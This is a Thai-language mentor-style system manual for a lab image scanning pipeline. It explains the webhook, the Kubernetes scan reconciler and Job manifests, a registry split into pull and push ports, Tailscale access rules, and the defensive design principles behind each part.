# Lab Image Scan: คู่มือระบบฉบับ Mentor

> **อ่านก่อน:** เอกสารนี้อธิบายระบบสแกน lab image ตั้งแต่อาจารย์อัปโหลดไฟล์จนถึง image ขึ้น ECR
> รวมถึงชั้นป้องกันรอบๆ (camp registry ที่แยก pull/push, Tailscale ACL) ทุกอย่างเขียนตามโค้ดที่ใช้งานจริง
> และทดสอบครบวงจรผ่านแล้วเมื่อ 2026-10-30
>
> ผมเขียนแบบพี่สอนน้อง: ทุกส่วนจะบอกว่า **ทำอะไร** และ **ทำไมถึงทำแบบนั้น** เพราะสิ่งที่แยก DevOps
> ที่ดีออกจากคนที่แค่ copy คำสั่งคือการรู้ว่าแต่ละบรรทัดกันปัญหาอะไรอยู่
> กล่อง **💡 Mentor** คือหลักคิดที่เอาไปใช้กับระบบอื่นได้ กล่อง **🧪 ลองเอง** คือแบบฝึกที่ทำบน cluster จริงได้

## สารบัญ

| ข้อ | เรื่อง | ถ้าอยากรู้ว่า... |
|---|---|---|
| 0 | [วิธีอ่านเอกสารนี้](#0-วิธีอ่านเอกสารนี้) | ควรเริ่มจากตรงไหน |
| 1 | [ภาพรวม](#1-ภาพรวม) | ระบบมีชิ้นอะไรบ้าง คุยกันยังไง |
| 2 | [หลักคิดที่ใช้ทั้งระบบ](#2-หลักคิดที่ใช้ทั้งระบบ) | ทำไมออกแบบแบบนี้ |
| 3 | [Webhook](#3-webhook-labimageservicehandle_upload_event) | ไฟล์เข้าคิวยังไง |
| 4 | [Scan Reconciler](#4-scan-reconciler-scan_reconcilerpy) | ใครเปิด Job / เก็บผล |
| 5 | [Scan Job](#5-scan-job-scan_job_servicepy) | Pod หน้าตาเป็นยังไง |
| 6 | [Scanner image และ runner.py](#6-scanner-image-scan-runner) | ข้างใน Pod ทำอะไร |
| 7 | [Namespace vlab-scan](#7-namespace-vlab-scan-k8sscan-namespaceyaml) | Pod ถูกขังไว้ยังไง |
| 8 | [Camp registry (pull / push)](#8-camp-registry-แยก-pull--push) | ทำไมมีสองพอร์ต |
| 9 | [Ansible role อื่นที่เกี่ยวข้อง](#9-ansible-role-อื่นที่เกี่ยวข้อง) | build / sync / Secret |
| 10 | [Tailscale ACL](#10-tailscale-acl) | ใครคุยกับใครได้ |
| 11 | [Deploy ตั้งแต่ศูนย์](#11-deploy-ตั้งแต่ศูนย์-runbook) | ลงเครื่องใหม่ทำตามลำดับไหน |
| 12 | [Test](#12-test) | รัน test ยังไง |
| 13 | [ดูสถานะและแก้ปัญหา](#13-ดูสถานะและแก้ปัญหา) | พังแล้วดูตรงไหน |
| 14 | [บทเรียนจากการสร้างระบบนี้](#14-บทเรียนจากการสร้างระบบนี้) | เคยพลาดอะไรมาแล้ว |
| 15 | [รีวิวความพร้อมและงานค้าง](#15-รีวิวความพร้อมและงานค้าง) | ยังขาดอะไร |
| 16 | [คำถามทบทวน](#16-คำถามทบทวน) | เข้าใจจริงหรือยัง |

---

## 0. วิธีอ่านเอกสารนี้

**รอบแรก (ภาพใหญ่):** อ่านข้อ 1, 2 และ 11 พอ จะรู้ว่าระบบมีชิ้นอะไรบ้าง ทำไมต่อกันแบบนี้ และลงเครื่องใหม่ต้องทำอะไรตามลำดับไหน

**รอบสอง (ลงลึก):** อ่านตามเส้นทางของไฟล์หนึ่งไฟล์ ข้อ 3 → 4 → 5 → 6 → 8 โดยเปิดไฟล์โค้ดคู่กันไปด้วย อย่าอ่านเอกสารอย่างเดียว

**รอบสาม (ความปลอดภัย):** ข้อ 7, 8, 10 แล้วลองตอบคำถามข้อ 16 ถ้าตอบได้โดยไม่เปิดเอกสาร แปลว่าเข้าใจระบบนี้แล้ว

**พื้นฐานที่ควรมีก่อน:** Docker (image, layer, registry, tag กับ digest), Kubernetes (Pod, Job, Secret, NetworkPolicy, namespace), Ansible (role, task, idempotency), เครือข่ายพื้นฐาน (พอร์ต, NAT)

### ไฟล์ทั้งหมดของระบบ

| ส่วน | ไฟล์ | รันที่ไหน |
|---|---|---|
| webhook ตั้งคิว | `web-portal/backend/app/services/lab_image_service.py` (`handle_upload_event`) | backend |
| Reconciler | `web-portal/backend/app/services/scan_reconciler.py` | backend (background task) |
| สร้าง Job | `web-portal/backend/app/services/scan_job_service.py` | backend (reconciler เรียก) |
| ค่าตั้ง | `web-portal/backend/app/configs/settings.py` | backend |
| Scanner image | `scan-runner/` (`Dockerfile`, `runner.py`, `policy.json`, `tests/`) | Pod ใน namespace `vlab-scan` บน master |
| Namespace / NetworkPolicy | `k8s/scan-namespace.yaml` | K3s (apply โดย role `k3s-server`) |
| Secret สำหรับ push | role `k3s-server` (task `Store registry push credentials`) | K3s |
| Camp registry | `ansible/roles/registry/` | เครื่อง registry (rn) |
| Build scanner image | `ansible/roles/scan-runner-image/` | rn |
| Build lab image | `ansible/build-images.yml` | rn |
| Sync ขึ้น ECR | `ansible/roles/ecr-sync/` | rn (systemd timer) |
| Tailscale ACL | `tailscale/vlab-acl.hujson`, `tailscale/vlab-tags.tsv`, `script/tailscale-acl.sh` | ทั้ง tailnet |

### เครื่องในระบบ (`ansible/inventory.yml`)

| host | ชื่อเครื่อง | Tailscale IP | หน้าที่ | tag |
|---|---|---|---|---|
| mn | masterpc | 100.99.154.106 | K3s server + **ที่รัน Job สแกน** | `tag:vlab-server` |
| wn1 | workerlabtop | 100.68.15.113 | K3s agent (รัน lab ของนักศึกษา) | `tag:vlab-worker` |
| rn | registrypc | 100.119.124.73 | camp registry, build image, ecr-sync | `tag:vlab-registry` |
| — | เครื่องคนในทีม | — | backend (FastAPI บน WSL), รัน Ansible | ไม่ติด tag (`autogroup:member`) |

---

## 1. ภาพรวม

```
อาจารย์ ── POST /lab-images/upload ──► backend ออก presigned PUT (repository ต้องขึ้นต้น vlab/)
   │
   └── PUT image.tar ──► R2 ──► Cloudflare Worker ──► POST /webhook/upload-trigger
                                                         │
                                                  แถวเป็น QUEUED (ไม่แตะ K8s)
                                                         │
             ┌──────────── scan reconciler (ทุก 15 วินาที) ────────────┐
             │  QUEUED → สร้าง Job + Secret (URL) → RUNNING             │
             │  อ่านผลจาก termination message ของ container publish    │
             └──────────────────────────────────────────────────────────┘
                                                         │
                         Job รันบน master (nodeSelector) ┘
                         fetch → validate → scan → publish
                                                         │
             PASS: push เข้า rn:5002 (login ด้วย Secret registry-push) → APPROVED → ลบ tar จาก R2
             FAIL / ERROR: บันทึกผล → ครบ 7 วัน reject (ลบ tar + ลบแถว)
                                                         │
             rn: vlab-ecr-sync.timer (ทุก ~2 นาที) อ่านจาก localhost:5001 → skopeo copy ขึ้น ECR
```

### camp registry: ประตูเข้า กับ ประตูออก

```
                       rn (registrypc)
   ┌───────────────────────────────────────────────────────┐
   │ camp-registry-pull :5001   read-only, ไม่มี auth        │◄── worker / master pull (K3s)
   │ camp-registry-push :5002   htpasswd (bcrypt)            │◄── master (Job สแกน, user scanner)
   │        └──────── /srv/camp-registry ใช้ร่วมกัน ──────────┘    Ansible บน rn (user ansible)
   │ ecr-sync ──► localhost:5001 (อ่านอย่างเดียว)                 │
   └───────────────────────────────────────────────────────┘
   Tailscale ACL: worker → :5001 เท่านั้น / server → ทุกพอร์ต
```

### หลักการสำคัญ 6 ข้อ
1. **webhook ไม่เรียก K8s** แค่ตั้ง `QUEUED` แล้วตอบทันที ถ้า cluster ล่ม webhook ก็ไม่ล้ม
2. **reconciler เป็นเจ้าของ K8s คนเดียว** ทั้งเปิด Job อ่านผล และลบ Job
3. **สถานะอยู่ใน DB ทั้งหมด** backend restart แล้ว รอบถัดไปทำต่อได้เอง
4. **Pod ไม่คุยกับ backend** backend อ่านผลจาก K8s API เอง Pod จึงไม่ต้องมี credential ของ backend
5. **ทางเดียวที่ image เข้า registry ได้คือผ่านการสแกน** push ได้เฉพาะที่ :5002 ซึ่งต้องมีรหัส และ ACL เปิดให้แค่ master
6. **backend ไม่รู้รหัสของ registry** รหัสอยู่ใน Secret ของ K8s ที่ Ansible สร้าง ส่งตรงเข้า container `publish`

### สถานะของการสแกน
```
NOT_STARTED ──(ไฟล์ขึ้น R2)──► QUEUED ──(reconciler เปิด Job)──► RUNNING
                                  ▲                                   │
                                  └──── retry / อัปไฟล์ทับ ────────────┤
                                                                      ▼
                                                      PASSED / FAILED / ERROR
```
`status` ของ image (`PENDING` → `APPROVED`) แยกจากสถานะสแกน `APPROVED` เกิดได้จาก PASS เท่านั้น

---

## 2. หลักคิดที่ใช้ทั้งระบบ

ข้อนี้สำคัญที่สุดในเอกสาร ถ้าเข้าใจ 7 หลักนี้ ส่วนที่เหลือจะอ่านง่ายขึ้นมาก เพราะทุกการตัดสินใจในข้อถัดไปมาจากหลักเหล่านี้

### 2.1 Defense in depth (กันหลายชั้น)
อย่าให้ความปลอดภัยพึ่งด่านเดียว ตัวอย่างในระบบนี้: worker push เข้า registry ไม่ได้ เพราะ
1. Tailscale ACL ไม่เปิดพอร์ต 5002 ให้ worker
2. ถึงจะหลุดเข้า 5001 ได้ ตัว 5001 ก็เป็น read-only ทั้งใน config และ mount ข้อมูลแบบ `:ro`
3. ถึงจะเข้า 5002 ได้ (เช่นเครื่องใน LAN เดียวกับ rn) ก็ต้องมีรหัส

ด่านไหนพังหรือตั้งค่าผิด ยังมีด่านถัดไปรับอยู่

### 2.2 Least privilege (ให้สิทธิ์เท่าที่จำเป็น)
- container `fetch` ตัวเดียวเห็น URL ของไฟล์, container `publish` ตัวเดียวเห็นรหัสของ registry
- worker ได้แค่ 6443 กับ 5001, registry เริ่มคุยกับใครไม่ได้เลย
- user ของ registry แยกตามงาน (`scanner` สำหรับ Job, `ansible` สำหรับ build) ถ้ารหัสตัวหนึ่งหลุด เปลี่ยนแค่ตัวนั้น

### 2.3 Secret ไม่อยู่ใน argv, env และ log
- **argv** ของ process ใครในเครื่องก็อ่านได้จาก `ps` หรือ `/proc/<pid>/cmdline` จึงส่งรหัสทาง stdin (`htpasswd -i`, `docker login --password-stdin`) หรือทางไฟล์ (`skopeo --dest-authfile`)
- **env** ถูก dump ง่าย (crash report, `kubectl describe`, debug log) จึงใช้ Secret mount เป็นไฟล์แทน env
- **log ของ Ansible** task ที่แตะรหัสต้องมี `no_log: true` ไม่งั้นรหัสจะโผล่ใน output ตอน task ล้ม

### 2.4 Idempotency (รันกี่รอบก็ได้ผลเดิม)
playbook ที่ดีรันซ้ำแล้วต้องไม่เปลี่ยนอะไร (`changed=0`) ถ้ารันซ้ำแล้วยังขึ้น changed แปลว่ามีบั๊ก หรือมีบางอย่างถูกทำซ้ำโดยไม่จำเป็น
ตัวอย่าง: bcrypt สุ่ม salt ทุกครั้ง ถ้าเขียน htpasswd ใหม่ทุกรอบ จะ changed ตลอด และ registry ถูก restart ทุกครั้งที่รัน role จึงตรวจรหัสเดิมก่อน (`htpasswd -v`) แล้วเขียนเฉพาะที่เปลี่ยน

### 2.5 Immutable artifact (ของที่ปล่อยแล้วห้ามเปลี่ยน)
`vlab/scan-runner:1.1.0` ต้องหมายถึงเนื้อหาเดียวกันตลอดไป ถ้าแก้โค้ด ต้องขึ้นเวอร์ชันใหม่ ห้าม push ทับ เพราะ Job ที่กำลังรันอยู่อาจกำลังใช้ tag นั้น และ ECR ตั้งเป็น `IMMUTABLE` ด้วยเหตุผลเดียวกัน

### 2.6 Reconciliation loop (ดูสถานะจริงแล้วแก้ให้ตรงเป้า)
แทนที่จะสั่งงานครั้งเดียวแล้วหวังว่าจะสำเร็จ reconciler จะวนดูทุก 15 วินาทีว่าสถานะจริง (Job ใน K8s) ต่างจากสถานะที่ต้องการ (แถวใน DB) ตรงไหน แล้วแก้ทีละนิด ข้อดีคือ backend ล่มกลางทาง รอบหน้าก็ทำต่อได้ ซึ่งเป็นหลักเดียวกับที่ Kubernetes ใช้เอง

### 2.7 Fail closed (ไม่แน่ใจ = ไม่ผ่าน)
ตรวจไม่ได้ = `ERROR` ไม่ใช่ `PASS`, ไม่มี credential = ไม่ push, skopeo policy ค่าเริ่มต้นคือ `reject` ระบบความปลอดภัยต้องปฏิเสธเป็นค่าเริ่มต้น แล้วค่อยเปิดเฉพาะสิ่งที่ตรวจแล้ว

> **💡 Mentor:** เวลาออกแบบหรือรีวิวระบบใหม่ ลองถามคำถาม 7 ข้อนี้กับทุกชิ้น เช่น "ถ้าด่านนี้พังจะเกิดอะไร",
> "รหัสนี้ไปโผล่ที่ไหนได้บ้าง", "รันซ้ำแล้วจะเป็นยังไง" ส่วนใหญ่ปัญหาจะโผล่ออกมาเอง

---

## 3. Webhook: `LabImageService.handle_upload_event`

เรียกเมื่อ Cloudflare Worker แจ้งว่ามีไฟล์ขึ้น R2 (ยืนยันตัวตนด้วย header `Webhook-Secret`)

1. หาแถวจาก `object_key` ไม่เจอ = ไม่ใช่ไฟล์ที่ระบบออก presign ให้ ตอบ `updated=false` (2xx เพื่อให้ Worker ไม่ retry)
2. เทียบ ETag ใหม่กับของเดิม ถ้าต่างกันหรือยังไม่เคยมีไฟล์ = **ไฟล์ใหม่**
3. บันทึก etag, ขนาด, เวลาอัปโหลด
4. ตั้ง `QUEUED` และรีเซ็ตจำนวนครั้งที่ลอง **เฉพาะเมื่อ** เป็นไฟล์ใหม่ + image ยัง `PENDING` + ยังสแกนไม่จบ
   - event ซ้ำ (etag เดิม) ไม่รีเซ็ต กัน Job ที่กำลังรันถูกนับใหม่
   - สแกนจบแล้วไม่เริ่มใหม่ เพราะไฟล์ที่ push ไปแล้วคือไฟล์ที่ถูกสแกน

**การบังคับชื่อ** (`lab_image_schema.py`): ตอนขอ presign `repository` ต้องขึ้นต้นด้วย `vlab/` และห้ามเป็น `vlab/scan-runner` ไม่งั้นได้ 400 (`repository_prefix` / `repository_reserved`) เหตุผลคือ IAM ของ ECR sync มีสิทธิ์แค่ `repository/vlab/*` ชื่อนอก prefix จะสแกนผ่านแต่ขึ้น ECR ไม่ได้ และห้ามชื่อ `vlab/scan-runner` เพราะจะทับตัวสแกนเอง

> **💡 Mentor:** webhook ตอบ 2xx แม้ไม่เจอแถว ฟังดูแปลก แต่ถ้าตอบ 4xx/5xx Worker จะ retry ไปเรื่อยๆ ทั้งที่ retry
> ยังไงก็ไม่มีวันสำเร็จ หลักคือ **ตอบ error เฉพาะเมื่อ retry แล้วมีโอกาสสำเร็จ**

---

## 4. Scan Reconciler (`scan_reconciler.py`)

### 4.1 การเริ่มและวนรอบ
- `main.py` สร้าง task `run_scan_reconciler` ตอน lifespan เริ่ม เมื่อ `LAB_IMAGE_SCAN_ENABLED=true` และ `K8S_ENABLED=true`
- `run_scan_reconciler(interval, stop)` วนจนกว่า `stop` ถูก set
  - เรียก `reconcile_once` ผ่าน `asyncio.to_thread` เพราะ Kubernetes SDK และ SQLAlchemy เป็น blocking จะได้ไม่บล็อก event loop ของ FastAPI
  - รอบไหนพัง (เช่น K3s ล่ม) แค่ log แล้วลองรอบหน้า แถวที่แก้ไปแล้วถูก commit ทีละแถวจึงไม่หาย
  - รอด้วย `asyncio.wait_for(stop.wait(), timeout=interval)` ตอนปิด backend จึงหยุดได้ทันที ไม่ต้องรอครบ interval
- `reconcile_once()`
  1. เปิด connection แยกแล้ว `pg_try_advisory_lock(880_003)` ถ้าได้ไม่ได้ แปลว่ามี backend ตัวอื่นทำรอบนี้อยู่ คืน `None`
  2. สร้าง session + `LabImageRepository` + `LabImageService` + `ScanReconciler`
  3. `run()` แล้วคืนผลเป็น dict
  4. ปิด session และปลด lock เสมอ (อยู่ใน `finally`)

  lock ถือบน connection แยกจาก session เพราะ session commit หลายครั้งในรอบเดียว แต่ lock ต้องอยู่ตลอดรอบ

> **💡 Mentor:** advisory lock คือวิธีกันงานซ้อนเวลามี backend หลายตัว (scale out) โดยไม่ต้องมี Redis หรือ ZooKeeper
> ใช้ Postgres ที่มีอยู่แล้วเป็น lock กลาง จำเทคนิคนี้ไว้ ใช้ได้กับ cron / background job ทุกแบบ

### 4.2 `run()`: 4 ขั้นต่อรอบ
```python
running = แถว RUNNING, queued = แถว QUEUED
jobs = read_scan_jobs(k8s) if (running or queued) else None   # ไม่มีงาน = ไม่แตะ K8s
if jobs is not None:
    for image in running: _collect(...)      # ขั้น 2
    launch_queued(...)                       # ขั้น 3
    _delete_orphan_jobs(jobs, ...)           # ขั้น 4ก
_reject_expired(...)                         # ขั้น 4ข (ทำทุกรอบ)
```
ผลของรอบเก็บใน `ReconcileResult` (`passed`, `failed`, `errored`, `retried`, `launched`, `rejected`, `orphans_deleted`) ถ้ามีอะไรเปลี่ยนจะถูก log

### 4.3 อ่านสถานะจาก K8s
- `read_scan_jobs(k8s)` เรียก API แค่ 2 ครั้งต่อรอบ: list Job และ list Pod ด้วย label `vlab/scan=true` แล้วจับคู่ Pod กับ Job ผ่าน label `job-name` ที่ K8s ใส่ให้เอง คืน `dict[ชื่อ Job, JobState]`
- `_job_kind(job)` อ่าน condition ของ Job: `Failed` → `FAILED` (พร้อม reason เช่น `DeadlineExceeded`), `Complete` → `SUCCEEDED`, อื่นๆ → `ACTIVE` ส่วน Job ที่ไม่อยู่ใน dict ถือว่าหาย
- `_pod_result(pod)` อ่าน termination message ของ container `publish` แล้ว parse เป็น JSON (อ่านไม่ได้ = `None`)
- `delete_scan_job(k8s, name)` ลบ Job ด้วย `propagation_policy="Background"` (Pod และ Secret ถูกลบตาม) 404 ถือว่าสำเร็จ

### 4.4 ขั้น 2: `_collect` เก็บผลของแถว `RUNNING`

| สภาพ Job | ทำอะไร |
|---|---|
| `ACTIVE` และยังไม่เกิน `SCAN_JOB_DEADLINE_SECONDS + 300` | รอต่อ |
| `ACTIVE` แต่เกินเวลา | `_retry_or_error("job did not finish in time")` (ปกติ K8s ต้องตัดเองด้วย `activeDeadlineSeconds` ไปแล้ว) |
| หาย | `_retry_or_error("scan job not found")` เช่นถูกลบ, หมด TTL, สร้างไม่สำเร็จ |
| `FAILED` | `_retry_or_error("scan job failed: <reason>")` |
| `SUCCEEDED` แต่อ่านผลไม่ได้ | `_retry_or_error("scan result missing or unreadable")` |
| ผล `etag` ไม่ตรงกับไฟล์ปัจจุบัน | ทิ้งผล กลับ `QUEUED` รีเซ็ตจำนวนครั้ง (อาจารย์อัปไฟล์ทับระหว่างสแกน) |
| `PASS` และมี `digest` | `_finish(PASSED, digest)` แล้ว `_approve_and_drop_archive` |
| `FAIL` | `_finish(FAILED)` |
| `ERROR` + `retryable` | `_retry_or_error(<reasons>)` |
| `ERROR` ถาวร, PASS ที่ไม่มี digest, verdict แปลก | `_finish(ERROR)` |

ทุกกรณีที่จบแล้วจะลบ Job ทิ้งทันที

Helper
- `_finish(image, status, summary, now, digest=None)` บันทึกสถานะ ผลสรุป เวลาจบ และ digest (ถ้ามี) แล้ว commit
- `_retry_or_error(image, reason, ...)` ถ้าลองไปแล้วน้อยกว่า `SCAN_MAX_ATTEMPTS` (2) กลับ `QUEUED` และเก็บ `lastError` ไม่งั้นเป็น `ERROR` ทั้งสองกรณีลบ Job ของรอบนั้น
- `_approve_and_drop_archive(image)` เรียก `approve_image` ถ้า approve ไม่ผ่าน (เช่นสถานะถูกเปลี่ยนไประหว่างนั้น) จะไม่ลบไฟล์ ให้คนมาดูต่อ ถ้าผ่านจะลบ tar จาก R2 เพราะ registry เป็นที่เก็บจริงแล้ว ลบไม่ได้แค่ log
- `_delete_job(name)` ลบ Job แล้วจำชื่อไว้ใน `self._deleted` กันนับเป็น orphan ซ้ำในรอบเดียวกัน

> **💡 Mentor:** ดูแถว "ผล etag ไม่ตรง" ให้ดี นี่คือ race condition ที่คนส่วนใหญ่ลืม: อาจารย์อัปไฟล์ใหม่ทับ
> ระหว่างที่ไฟล์เก่ากำลังถูกสแกน ถ้าเชื่อผลโดยไม่เช็ก etag จะ approve ไฟล์ใหม่ที่ไม่เคยถูกสแกน

### 4.5 ขั้น 3: `launch_queued` เปิด Job ให้แถว `QUEUED`
1. คำนวณที่ว่าง = `SCAN_MAX_CONCURRENT` (2) − จำนวน `RUNNING` ถ้าเต็มก็จบ
2. ถ้ายังไม่ได้ตั้ง registry (`DOCKER_REGISTRY_HOST` / `scan_runner_image` / `registry_push_host`) ไม่เปิด Job และไม่เผาจำนวนครั้งที่ลอง เพราะไม่ใช่ความผิดของแถว (`ScanJobConfigError`)
3. วนแถว `QUEUED` เรียงตามเวลาอัปโหลด (มาก่อนได้ก่อน) เท่าที่ว่าง
   - ข้ามแถวที่ไม่ใช่ `PENDING`
   - ไม่มี etag หรือขนาดไฟล์ → `ERROR` ทันที เพราะตรวจว่าไฟล์ตรงกับที่บันทึกไม่ได้
4. ลบ Job ของรอบก่อน (ถ้ามี) ไม่งั้นผลเก่าอาจถูกอ่าน
5. **commit ก่อนแตะ K8s:** เพิ่มจำนวนครั้ง, ตั้งชื่อ Job ใหม่, `RUNNING`, เวลาเริ่ม ถ้าสร้าง Job ไม่สำเร็จ รอบหน้าจะเห็น Job หายแล้ว retry เอง จึงไม่มีทางได้ Job ซ้ำ
6. `launch_scan_job(...)` ถ้าล้มแค่ log แล้วไปแถวถัดไป แถวเดียวพังไม่หยุดแถวอื่น

### 4.6 ขั้น 4: เก็บกวาด
- `_delete_orphan_jobs` ลบ Job ที่มี label `vlab/scan` แต่ไม่ใช่ Job ปัจจุบันของแถว `RUNNING` ไหนเลย เช่นแถวถูกลบ หรือถูกแทนด้วยรอบใหม่ (เรียก `db.expire_all()` ก่อน เพื่ออ่านค่าล่าสุดหลังขั้น 2-3)
- `_reject_expired` แถว `FAILED`/`ERROR` ที่จบเกิน `SCAN_FAILED_RETENTION_DAYS` (7 วัน) → `reject_image` (ลบ tar จาก R2 แล้วลบแถว คืนชื่อ `repository:tag` ให้ใช้ใหม่) ระยะ 7 วันมีไว้ให้อาจารย์ได้เห็นเหตุผลก่อน ถ้า reject ไม่ได้ (ถูกอ้างอิงอยู่, R2 ลบไม่ได้) จะข้ามไปลองรอบหน้า

### 4.7 ค่าที่เกี่ยวข้อง (`settings.py`)
| ค่า | ค่าเริ่มต้น | ความหมาย |
|---|---|---|
| `LAB_IMAGE_SCAN_ENABLED` | `False` | เปิด reconciler |
| `SCAN_NAMESPACE` | `vlab-scan` | namespace ของ Job |
| `SCAN_RECONCILE_INTERVAL_SECONDS` | 15 | ระยะห่างระหว่างรอบ |
| `SCAN_MAX_CONCURRENT` | 2 | Job พร้อมกันสูงสุด |
| `SCAN_MAX_ATTEMPTS` | 2 | ลองได้กี่ครั้งก่อนเป็น ERROR |
| `SCAN_JOB_DEADLINE_SECONDS` | 1800 | `activeDeadlineSeconds` ของ Job |
| `SCAN_FAILED_RETENTION_DAYS` | 7 | เก็บแถว FAILED/ERROR กี่วันก่อน reject |
| `SCAN_DOWNLOAD_URL_TTL_SECONDS` | 3600 | อายุ presigned GET |
| `SCAN_FAIL_SEVERITY` | `CRITICAL` | ระดับที่ทำให้ FAIL |
| `SCAN_WORK_SIZE_LIMIT` | `15Gi` | ขนาด `emptyDir` ของ `/work` |
| `SCAN_PRIORITY_CLASS` | `vlab-scan` | PriorityClass ของ Pod |
| `SCAN_RUNNER_IMAGE` / `SCAN_RUNNER_VERSION` | ว่าง / `1.1.0` | ไม่ตั้ง image = `<DOCKER_REGISTRY_HOST>/vlab/scan-runner:<version>` (`settings.scan_runner_image`) |
| `DOCKER_REGISTRY_HOST` | ว่าง | **pull** endpoint (`100.119.124.73:5001`) ใช้ทั้ง SkyPilot และ image ของ scanner |
| `REGISTRY_PUSH_HOST` / `REGISTRY_PUSH_PORT` | ว่าง / `5002` | **push** endpoint ไม่ตั้ง host = host ของ `DOCKER_REGISTRY_HOST` + พอร์ตนี้ (`settings.registry_push_host`) |
| `SCAN_PUSH_SECRET` | `registry-push` | ชื่อ Secret ที่ mount ให้ `publish` (ต้องตรงกับ `scan_push_secret` ของ role `k3s-server`) |
| `SCAN_NODE_SELECTOR` | `{"node-role.kubernetes.io/control-plane": "true"}` | บังคับ Pod ลง master ตั้ง `{}` = ไม่บังคับ |

> **🧪 ลองเอง:** ใน `.env` ไม่มี `REGISTRY_PUSH_HOST` แต่ระบบก็รู้ว่าต้อง push ไป `100.119.124.73:5002`
> ลองหาใน `settings.py` ว่าค่านี้คำนวณมาจากไหน แล้วลองนึกว่าถ้าวันหนึ่งย้าย registry ไปเครื่องอื่น ต้องแก้กี่ที่

---

## 5. Scan Job (`scan_job_service.py`)

สร้าง K8s Job ที่รัน scanner กับ tar ของ image หนึ่งแถว เรียกจาก `launch_queued` เท่านั้น

| ชื่อ | ทำอะไร |
|---|---|
| `ScanJobConfigError` | exception เมื่อตั้งค่าไม่ครบ (ไม่มี registry) แยกจาก error ของแถว |
| `scan_job_name(image, attempt)` | สร้างชื่อ `scan-{id 12 ตัว}-{etag 8 ตัว}-a{attempt}` ยาวไม่เกิน 63 ตัว ใช้ได้ทั้งเป็นชื่อ Job และ Secret ชื่อเปลี่ยนเมื่อไฟล์หรือรอบเปลี่ยน ไม่มี etag ใช้ `noetag` |
| `_labels(image, job_name)` | label `vlab/scan=true`, `vlab/scan-image-id`, `vlab/scan-job` ใส่ทั้ง Job, Pod และ Secret (reconciler หาด้วย `vlab/scan=true`) |
| `_env(values)` | แปลง dict เป็นรายการ env ของ K8s ข้ามค่าว่าง |
| `_container(name, args, env, requests, limits, extra_mounts)` | container หนึ่งตัวด้วย image ของ scanner + securityContext ชุดเดียวกัน: ห้ามยกสิทธิ์, rootfs read-only, non-root 10001, drop ALL capabilities, seccomp `RuntimeDefault`, mount `/work` |
| `build_scan_job(image, job_name)` | manifest ของ Job เป็น dict (ฟังก์ชันล้วน ไม่แตะ cluster จึง test ได้) |
| `build_download_secret(image, job_name, url, job_uid)` | Secret ชื่อเดียวกับ Job มี key `download_url` และ `ownerReferences` ชี้ Job |
| `_uid_of(obj)` | อ่าน `metadata.uid` ของ Job ได้ทั้งจาก dict และ object ของ SDK |
| `launch_scan_job(k8s, r2, image, job_name)` | สร้าง Job แล้วสร้าง Secret ของ URL |
| `_delete_job_quietly(k8s, job_name)` | ลบ Job แบบไม่โยน error ใช้ตอนสร้าง Secret ไม่สำเร็จ |

### 5.1 Manifest ของ Job (`build_scan_job`)

**Container 4 ตัว ใช้ image เดียวกัน** ต่างกันที่คำสั่งย่อย และส่ง env / secret เฉพาะที่ขั้นนั้นใช้

| container | ชนิด | env | requests → limits | secret ที่เห็น |
|---|---|---|---|---|
| `fetch` | init | `IMAGE_ID`, `ETAG`, `EXPECTED_SIZE` | 100m/128Mi → 1/256Mi | `/secrets/fetch/download_url` (URL ของไฟล์) |
| `validate` | init | `IMAGE_ID`, `ETAG`, `ALLOWED_ARCH=amd64`, `DECLARED_PORTS` | 100m/256Mi → 1/1Gi | ไม่มี |
| `scan` | init | `IMAGE_ID`, `ETAG`, `POLICY_FAIL_SEVERITY`, `POLICY_IGNORE_UNFIXED=true` | 500m/1Gi → 2/4Gi | ไม่มี |
| `publish` | main | `IMAGE_ID`, `ETAG`, `REGISTRY` (= push host :5002), `REPOSITORY`, `TAG` | 100m/256Mi → 1/1Gi | `/secrets/push/{username,password}` |

`publish` ต้องชื่อนี้ตรงตัว เพราะ reconciler อ่านผลจาก container นี้

**Pod**
- `restartPolicy: Never`, ไม่ mount service account token, `enableServiceLinks: false` (ไม่ใส่ env ของ Service อื่น)
- securityContext ระดับ Pod เป็น non-root 10001 + `fsGroup`, ใส่ `priorityClassName` ถ้าตั้งไว้
- **`nodeSelector` จาก `SCAN_NODE_SELECTOR`** บังคับให้ลง master (เหตุผลในข้อ 10.3)

**Volume**
| ชื่อ | ชนิด | mount เข้า | ผูกกับ |
|---|---|---|---|
| `work` | `emptyDir` จำกัด `SCAN_WORK_SIZE_LIMIT` | ทุก container ที่ `/work` | Pod (หายเมื่อ Pod จบ) |
| `download-url` | Secret ชื่อเดียวกับ Job, 0400, key `download_url` | `fetch` เท่านั้น | Job (ลบตาม Job) |
| `push-credentials` | Secret `registry-push`, 0400, key `username` / `password` | `publish` เท่านั้น | ถาวร (Ansible สร้าง) |

**Job:** `backoffLimit: 0` (การ retry เป็นหน้าที่ reconciler ที่นับครั้งเอง), `activeDeadlineSeconds: SCAN_JOB_DEADLINE_SECONDS`, `ttlSecondsAfterFinished: 3600` (กันค้าง ปกติ reconciler ลบทันทีที่ได้ผล)

> **💡 Mentor:** สังเกตว่า Secret มีสองแบบที่อายุต่างกัน URL ของไฟล์เปลี่ยนทุก Job จึงสร้างพร้อม Job และให้ลบตาม Job
> (ownerReference) ส่วนรหัสของ registry ใช้ร่วมกันทุก Job จึงให้ Ansible สร้างไว้ครั้งเดียว
> **อายุของ secret ควรเท่ากับอายุของสิ่งที่ใช้มัน** ไม่ยาวกว่านั้น

### 5.2 ลำดับของ `launch_scan_job`
1. สร้าง manifest แล้ว `create_namespaced_job` ถ้าได้ 409 (มี Job ชื่อนี้แล้ว เช่นรอบก่อนสร้างไปแต่ commit ไม่ทัน) อ่าน Job เดิมมาใช้
2. ออก presigned GET **ตอนนี้** ไม่ใช่ตอนเข้าคิว URL จึงสดเสมอ
3. สร้าง Secret ที่มี `ownerReference` ชี้ uid ของ Job
   - ได้ 409 → `replace` ด้วย URL ใหม่
   - error อื่น → ลบ Job ที่เพิ่งสร้างแล้วโยน error ให้ reconciler จัดการรอบหน้า

**ทำไมสร้าง Job ก่อน Secret:** Secret ต้องรู้ uid ของ Job เพื่อผูก ownerReference ส่วน Pod จะรอที่ `ContainerCreating` (เห็นเป็น `Init:0/3`) จนกว่า Secret มา เพราะ kubelet retry การ mount เอง เมื่อลบ Job แล้ว garbage collector ลบ Secret ตาม จึงไม่มี URL ค้างใน cluster

ถ้า Secret `registry-push` ไม่มีใน namespace Pod จะค้างที่ `ContainerCreating` ด้วยเหตุผลเดียวกัน (mount ไม่ได้) จนหมด deadline ดูวิธีแก้ในข้อ 13

